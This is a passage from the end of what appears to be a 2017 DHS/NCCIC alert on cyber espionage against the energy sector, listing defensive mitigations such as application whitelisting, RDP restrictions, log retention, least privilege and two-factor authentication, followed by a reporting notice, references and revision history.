Software\nRestriction Policy, AppLocker, or similar software. Safe defaults allow applications to run from PROGRAMFILES, PROGRAMFILES(X86), SYSTEM32, and any ICS software\nfolders. All other locations should be disallowed unless an exception is granted.\nBlock RDP connections originating from untrusted external addresses unless an exception exists; routinely review exceptions on a regular basis for validity.\nStore system logs of mission critical systems for at least one year within a security information event management tool.\nEnsure applications are configured to log the proper level of detail for an incident response investigation.\nConsider implementing HIPS or other controls to prevent unauthorized code execution.\nEstablish least-privilege controls.\nReduce the number of Active Directory domain and enterprise administrator accounts.\nBased on the suspected level of compromise, reset all user, administrator, and service account credentials across all local and domain systems.\nEstablish a password policy to require complex passwords for all users.\nEnsure that accounts for network administration do not have external connectivity.\nEnsure that network administrators use non-privileged accounts for email and Internet access.\nUse two-factor authentication for all authentication, with special emphasis on any external-facing interfaces and high-risk environments (e.g., remote access,\nprivileged access, and access to sensitive data).\nImplement a process for logging and auditing activities conducted by privileged accounts.\nEnable logging and alerting on privilege escalations and role changes.\nPeriodically conduct searches of publically available information to ensure no sensitive information has been disclosed. Review photographs and documents for\nsensitive data that may have inadvertently been included.\nAssign sufficient personnel to review logs, including records of alerts.\nComplete independent security (as opposed to compliance) risk review.\nCreate and participate in information sharing programs.\nCreate and maintain network and system documentation to aid in timely incident response. Documentation should include network diagrams, asset owners, type of\nasset, and an incident response plan.\nReport Notice\nDHS encourages recipients who identify the use of tools or techniques discussed in this document to report information to DHS or law enforcement immediately. To\nrequest incident response resources or technical assistance, contact NCCIC at NCCICcustomerservice@hq.dhs.gov or 888-282-0870.\nReferences\n[1] FireEye. Factors Motivating Cyber Espionage Against the Energy Sector. Sept…\n[2] Symantec. Dragonfly: Western energy sector targeted by sophisticated attack…\n[2] Symantec. Dragonfly: Western energy sector targeted by sophisticated attack…\n[4] CCIRC CF17-010 UPDATE\n[5] MIFR-10127623\nRevisions\nOctober 20, 2017: Initial version\nMarch 15, 2018: Updated to provide guidance that this alert has been superseded by newer information.\nThis product is provided subject to this Notification  and this Privacy & Use  policy.\nWas this document helpful?  Yes  |  Somewhat   |  No\nContact Us\n(888)282-0870\nSend us email\nDownload PGP/GPG keys\nSubmit website feedbackSubscribe to Alerts\nReceive security alerts, tips, and other updates.\n Enter your email address\nSign Up  \n HSINReport\nSearch\n "
}